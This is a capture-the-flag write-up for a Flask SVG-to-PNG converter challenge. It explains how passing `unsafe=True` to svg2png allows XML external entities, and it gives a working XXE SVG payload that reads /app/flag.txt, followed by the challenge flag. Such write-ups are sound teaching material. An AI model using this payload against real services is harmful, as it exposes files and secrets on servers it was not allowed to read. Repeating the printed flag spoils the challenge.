# image-converter-pro

## Description
> <challenge_prompt>

Tags: _web_

## Recon

I was given a Flask web application that converts SVG files to PNG images.

Examining the source code, I found several interesting details:

- The application has a registration and login system with a verification requirement. Only verified users can access the `/converter` endpoint.
- File Upload Restrictions:
```python
ALLOWED_EXTENSIONS = {"svg"}
SAFE = True
```

```python
@app.route("/converter", methods=["GET", "POST"])
@verified_required
def converter():
    # ... file validation ...
    content = file.read()
    output = BytesIO()
    
    try:
        svg2png(bytestring=content, write_to=output, unsafe=SAFE)
        output.seek(0)
    except Exception as e:
        flash(str(e), "danger")
        return render_template("converter.html")
```

The critical line is: `svg2png(bytestring=content, write_to=output, unsafe=SAFE)`

Since `SAFE = True`, this actually passes `unsafe=True` to the svg2png function, which enables dangerous features like loading external entities.

From the `entrypoint.sh` file, I found that the flag is stored at `/app/flag.txt`:
```bash
echo $FLAG >/app/flag.txt
```

## Exploitation

First, I registered an account and logged in to access the converter functionality.

The vulnerability lies in the `unsafe=True` parameter passed to `svg2png`. This allows me to use XML External Entity (XXE) injection to read local files.

I started with a basic SVG example from W3Schools:
```html
<svg height="200" width="300" xmlns="http://www.w3.org/2000/svg">
  <image width="300" height="200" href="pulpitrock.jpg" />
  Sorry, your browser does not support inline SVG.  
</svg>
```

I modified it to try reading the flag file:
```html
<svg xmlns="http://www.w3.org/2000/svg">
  <image href="file://app/flag.txt" />
</svg>
```

However, this resulted in an error:
```
[Errno cairo returned CAIRO_STATUS_WRITE_ERROR: b'error while writing to output stream']
```

After researching, I found the correct XXE syntax for SVG files. The solution was to use an XML DOCTYPE with an external entity and render it as text:

```html
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY test SYSTEM "file:///app/flag.txt">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="5000" height="1080">
  <text x="10" y="100" font-size="40" font-family="monospace">&test;</text>
</svg>
```

I uploaded this SVG to the converter, and it successfully generated `converted.png` with the flag rendered as text

## Flag

`CLA{pr0_us3r_unl0ck3d_r0E9NGqoFgQt}`
